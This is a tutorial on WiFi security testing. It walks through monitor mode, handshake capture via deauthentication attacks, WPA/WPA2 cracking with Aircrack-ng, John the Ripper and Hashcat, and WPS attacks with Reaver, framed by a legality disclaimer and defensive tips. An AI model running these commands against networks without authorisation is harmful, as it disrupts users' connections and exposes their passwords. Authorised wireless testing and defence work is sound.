### Comprehensive Notes on WiFi Hacking

WiFi hacking involves various techniques and tools to test the security of wireless networks. This guide covers the essential tools and techniques, including Aircrack-ng, Airmon-ng, and password cracking.

### Disclaimer

WiFi hacking should only be performed on networks you own or have explicit permission to test. Unauthorized access to networks is illegal and unethical.

### Essential Tools

1. **Aircrack-ng Suite**: A comprehensive suite for assessing WiFi network security.
2. **Airmon-ng**: Used to enable monitor mode on wireless interfaces.
3. **Airodump-ng**: For capturing raw 802.11 frames.
4. **Aireplay-ng**: For injecting frames.
5. **Aircrack-ng**: For cracking WEP and WPA-PSK keys.
6. **Wireshark**: A network protocol analyzer to inspect captured data.

### Setting Up

#### Install Aircrack-ng

On Debian-based systems (e.g., Ubuntu, Kali Linux):
```bash
sudo apt-get update
sudo apt-get install aircrack-ng
```

On Arch-based systems:
```bash
sudo pacman -S aircrack-ng
```

### WiFi Hacking Steps

#### 1. Enable Monitor Mode with Airmon-ng

Monitor mode allows your wireless card to capture all packets in the air.
```bash
sudo airmon-ng start wlan0
```
Replace `wlan0` with your network interface name.

#### 2. Capture Packets with Airodump-ng

Use Airodump-ng to capture packets and gather information about nearby WiFi networks.
```bash
sudo airodump-ng wlan0mon
```
Replace `wlan0mon` with your monitor mode interface name.

#### 3. Target a Specific Network

To target a specific network, note the BSSID (MAC address) and channel (CH) from the Airodump-ng output.
```bash
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
```
Replace `<channel>`, `<BSSID>`, and `capture` with the appropriate values.

#### 4. Deauthenticate Clients with Aireplay-ng

Deauthentication attacks force clients to reconnect, capturing the WPA/WPA2 handshake.
```bash
sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon
```
Replace `<BSSID>` with the target network's BSSID.

#### 5. Crack WPA/WPA2 Handshake with Aircrack-ng

Once you capture the handshake, use Aircrack-ng to crack the password.
```bash
sudo aircrack-ng -w /path/to/wordlist -b <BSSID> capture-01.cap
```
Replace `/path/to/wordlist` with the path to your wordlist file and `<BSSID>` with the target BSSID. The `capture-01.cap` file is the output from Airodump-ng.

### Advanced Techniques

#### Using John the Ripper for WPA/WPA2 Cracking

John the Ripper can be used to crack WPA/WPA2 passwords by leveraging its wordlists and powerful cracking algorithms.

1. **Convert the .cap file to a format John can read**:
   ```bash
   aircrack-ng -J output capture-01.cap
   ```
   This converts the .cap file to a .john format.

2. **Run John the Ripper**:
   ```bash
   john --wordlist=/path/to/wordlist output.john
   ```

#### Using Hashcat for WPA/WPA2 Cracking

Hashcat is a highly efficient password cracking tool that supports GPU acceleration.

1. **Convert the .cap file to .hccapx format**:
   ```bash
   cap2hccapx.bin capture-01.cap capture.hccapx
   ```

2. **Run Hashcat**:
   ```bash
   hashcat -m 2500 capture.hccapx /path/to/wordlist
   ```

### Additional Tools and Techniques

#### Wifite

Wifite automates the process of WiFi hacking, making it easier to perform attacks.
```bash
sudo wifite
```
It scans for targets and performs the necessary attacks automatically.

#### Reaver

Reaver targets WPS (Wi-Fi Protected Setup) to recover WPA/WPA2 passphrases.
```bash
sudo reaver -i wlan0mon -b <BSSID> -vv
```

### Best Practices

1. **Use Strong Passwords**: Always use complex, unique passwords for your WiFi network.
2. **Disable WPS**: WPS is a common attack vector and should be disabled.
3. **Monitor Network**: Regularly monitor your network for suspicious activity.
4. **Keep Firmware Updated**: Ensure your router’s firmware is up-to-date to protect against known vulnerabilities.

### Ethical Considerations

- **Only Test Your Own Networks**: Ensure you have permission before testing any network.
- **Report Findings**: If you discover vulnerabilities, report them to the network owner or administrator.

### Conclusion

WiFi hacking techniques and tools like Aircrack-ng, Airmon-ng, and others are essential for assessing the security of wireless networks. Always use these tools responsibly and within legal boundaries to enhance the security of your own networks or those you are authorized to test.
